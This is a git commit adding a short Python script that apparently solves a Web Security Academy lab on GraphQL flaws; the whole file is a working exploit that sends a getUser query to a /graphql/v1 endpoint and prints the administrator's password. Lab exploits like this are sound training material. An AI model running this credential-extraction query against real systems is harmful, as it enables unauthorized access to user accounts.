58caa851649e4a96d93d96a2b191e2ff5f730c1b
prince-dom <spiritmelodyme@gmail.com>
2023-11-20 14:24:11 +0530

    intial commit

---
+++ Graphql_API_Vulnerabilities/LAB-2.py
@@ -0,0 +1,40 @@
+import requests
+import sys
+import json
+
+def req(url):
+    json_payload = {
+        "query":"""
+            query {
+        getUser(id: 1) {
+            id
+            password
+            username
+        }
+    }"""
+    }
+    headers = {
+        'Content-Type': 'application/json'
+    }
+    vuln_path = url+'/graphql/v1'
+    r = requests.post(url=vuln_path, headers=headers, json=json_payload)
+    data = r.json()
+    blog_post = data.get('data', {}).get('getUser', {})
+    if blog_post:
+        print("Password for administrator : ",blog_post.get('password'))
+    else:
+        print("failed!")
+
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s https://xxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net" % sys.argv[0])
+        sys.exit(-1)
+    url = sys.argv[1]
+    print("Exploiting...")
+    req(url)
+
+
+if __name__=='__main__':
+    main()
